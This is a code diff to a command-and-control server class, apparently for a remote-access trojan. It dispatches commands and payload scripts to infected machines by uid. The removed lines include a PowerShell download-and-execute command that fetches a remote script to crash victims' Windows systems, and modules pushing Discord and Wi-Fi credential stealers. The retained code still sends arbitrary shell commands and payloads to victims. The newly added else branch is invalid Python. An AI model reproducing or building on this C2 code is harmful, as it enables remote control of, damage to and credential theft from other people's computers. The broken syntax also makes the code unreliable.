@@ -229,31 +229,17 @@ class C2:
         explotation_module_type = data["explotation_module"]
         uids = data["uids"]
 
-        if explotation_module_type == "bsod":
-            command = "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD"
-            for uid in uids:
-                self.sio.emit("command", {"uid": uid, "cmd": command})
-
-        if explotation_module_type == "discord":
-            for uid in uids:
-                self.sio.emit("pem", {"uid": uid, "url": "client/pem/discord.py"})
-
-        if explotation_module_type == "wifi-password":
-            for uid in uids:
-                self.sio.emit("pem", {"uid": uid, "url": "client/pem/wifi.py"})
-
         if explotation_module_type == "send-command":
             for uid in uids:
                 print(data["input"])
                 self.sio.emit("command", {"uid": uid, "cmd": data["input"], "key": "server"})
 
-        if explotation_module_type == "restart":
+        elif explotation_module_type == "disconect":
             for uid in uids:
-                self.sio.emit("restart", uid)
+                self.sio.emit("pem", {"uid": uid, "url": "stop.py"})
 
-        if explotation_module_type == "disconect":
-            for uid in uids:
-                self.sio.emit("pem", {"uid": uid, "url": "client/pem/stop.py"})
+        else uid in uids:
+            self.sio.emit("pem", {'uid': uid, "url": data['path']})
 
     def generate(self, generate):
         os_name = generate["os"]
